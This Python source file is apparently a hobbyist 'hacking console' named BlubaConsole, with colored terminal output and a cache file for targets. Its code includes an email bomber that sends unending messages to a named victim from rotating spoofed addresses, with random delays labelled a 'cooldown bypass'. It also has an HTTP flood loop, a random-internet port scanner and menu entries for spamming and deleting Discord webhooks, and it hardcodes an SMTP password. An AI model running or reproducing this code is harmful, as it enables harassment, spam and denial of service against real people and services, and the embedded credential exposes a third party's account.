from pystyle import System, Colors, Colorate, Write
from colorama import Fore, Style
import socket
import ping3
import requests
import random
import json
import datetime
import subprocess
import os
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee
common_ports = [21, 22, 25, 53, 67, 68, 69, 79, 80, 110, 113, 123, 143, 443, 465, 587, 993, 995, 2002, 3300, 3306, 4000, 4002, 5000, 5002, 5003, 14147, 25565]
red = Fore.RED
lightred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET + Style.NORMAL
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT
dark = Style.DIM
normal = Style.NORMAL


ct8smtphost = "s1.ct8.pl"
ct8smtpport = 587
ct8smtppass = "BlubaMailBomber23:6"
#{reset}{dark}╠═{normal}{pink}Project Github: {pretty}https://github.com/CNM-GCANP/BlubaConsole
def info():
    print(f"""
{reset}{dark}╔════[ {normal}{cyan}BlubaConsole{reset}{dark}]
{reset}{dark}╠═{normal}{pink}Author: {pretty}gigachadaniepizda1
{reset}{dark}╠═{normal}{pink}Github: {pretty}https://github.com/CNM-GCANP
{reset}{dark}╠═{normal}{pink}BIO: {pretty}https://guns.lol/nyga
{reset}{dark}╚════[ {normal}{cyan}BlubaConsole {reset}{dark}]
""")
    
def format_date(date):
    return date.strftime('%Y-%m-%d %H:%M:%S %Z') if date else "N/A"

def checkip(adres_ip):
    czas_odpowiedzi = ping3.ping(adres_ip)
    if czas_odpowiedzi is not None:
        return True
    else:
        return False
def help(w):
    if w == "all":
        print("""
ls - you know
cat/view - you know v2
exit - i think that stupid you aren't
bat - runs batch scripts
clear - clears console
clear cache - clears cache
    """)
        help("ip")
        help("domain")
        help("web")
        help("discord")
    elif w == "ip":
        print("""
ip set <ip address/url> - change your target ip
ip check <ip address/url> - check ip
ip pinger - pings ip
ip nmap <all/common> - nmap scan
ip lan scan <port> - scans lan network for open port
    """)
    elif w == "domain":
        print("""
domain ip <domain> - get domain ip
domain whois <domain> - whois domain
    """)
    elif w == "web":
        print("""
web file download <url> <output file> - downloads file from url
web scan <wordlist> - something like gobuster (uses your cached ip)
web mail set <subject/body/victim> <arg> - sets information about bomber
web mail spam - starts email bomber
    """)
    elif w == "discord":
        print("""
discord webhook send <message> <webhook> - sends message to webhhok
discord webhook spam <message> <webhook> - spams message to webhhok
discord check <webhook> - checks if webhook is valid
discord delete <webhook> - deletes webhook
    """)
        
def getip(domain):
    temp = socket.gethostbyname(domain)
    return temp

def stress(ip):
    while True:
        result = requests.get("http://"+ip)
        print(result.status_code)
def scan_port(ip, port):
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not tcp.connect_ex((ip, port)):
            time_rn = get_time_rn()
            print(f'{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{green}+{reset}{dark}) {normal}{pretty}%s:%d/TCP Open' % (ip, port))
        tcp.close()
    except Exception:
        pass
def find(port):
    while True:
        ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
        ip = ".".join(ip_parts)
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(ip)
            if not tcp.connect_ex((ip, port)):
                print('[+] %s:%d/TCP Open' % (ip, port))
            tcp.close()
        except Exception as e:
            pass
def loadJip():
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    return data['IP']
def setJip(ip):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['IP'] = ip
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)


def loadJbombersubject():
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    return data['BomberSubject']
def setJbombersubject(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberSubject'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)

def loadJbomberbody():
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    return data['BomberBody']
def setJbomberbody(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberBody'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)

def loadJbombervictim():
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    return data['BomberVictim']
def setJbombervictim(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberVictim'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
        
def scan_ip(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = sock.connect_ex((ip, port))
    if result == 0:
        time_rn = get_time_rn()
        print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{green}+{reset}{dark}) {normal}{pretty}IP Found: {cyan}{ip}")
    else:
        return 0


def getsmtp(smtp):
    ct8smtpmails = [
        "2456@mailbomberblub.ct8.pl",
        "5678@mailbomberblub.ct8.pl",
        "2345@mailbomberblub.ct8.pl",
        "9843@mailbomberblub.ct8.pl",
        "8365@mailbomberblub.ct8.pl",
        "9475@mailbomberblub.ct8.pl",
        "0164@mailbomberblub.ct8.pl",
        "5713@mailbomberblub.ct8.pl",
        "9465@mailbomberblub.ct8.pl"
    ]
    if int(smtp) == 1:
        mail = random.choice(ct8smtpmails)
        return mail
def spammail(bombervictim, bombersubject, bomberbody):
    try:
        while True:
            smtp = random.randint(1,1)
            if smtp == 1:
                host = "s1.ct8.pl"
                smport = 587
                password = "BlubaMailBomber23:6"
                frommail = "BlubaBomberONTOP" + str(random.randint(1, 1000)) + "@mailbomberblub.ct8.pl"
                mail = getsmtp(smtp)
            message = MIMEMultipart()
            message["From"] = frommail
            message["To"] = bombervictim
            message["Subject"] = bombersubject
            message.attach(MIMEText(bomberbody, "plain"))
            server = smtplib.SMTP(host, smport)
            server.starttls()
            server.login(mail, password)
            try:
                server.sendmail(frommail, bombervictim, message.as_string())
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Message Sended {gray}| {green}{smtp}")
            except Exception as e:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Error {gray}| {str(e)}")
            except KeyboardInterrupt:
                print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
            finally:
                server.quit()
            t = random.randint(1,9)
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pink}Waiting {t} seconds (Cooldown Bypass)")
            time.sleep(t)
    except KeyboardInterrupt:
        print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
